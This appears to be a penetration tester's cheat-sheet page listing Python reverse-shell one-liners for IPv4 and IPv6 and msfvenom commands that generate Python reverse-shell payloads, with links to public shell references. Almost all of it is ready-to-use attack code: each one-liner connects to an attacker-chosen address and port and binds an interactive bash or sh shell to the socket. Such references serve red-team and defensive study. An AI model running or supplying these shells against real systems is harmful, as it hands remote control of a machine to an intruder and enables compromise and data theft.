# Python

## 01 - One-liners

### 1.1 - IPv4

First variant.

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Second variant.

```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Third variant that works with [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Shell Handler/Cross Platform/Manual/Socat|socat]] listener.

```
$ python -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("<IP>"),int(os.getenv("<PORT>")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
```

### 1.2 - IPv6

```
$ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<IPv6>",<PORT>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### GTFOBins

- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)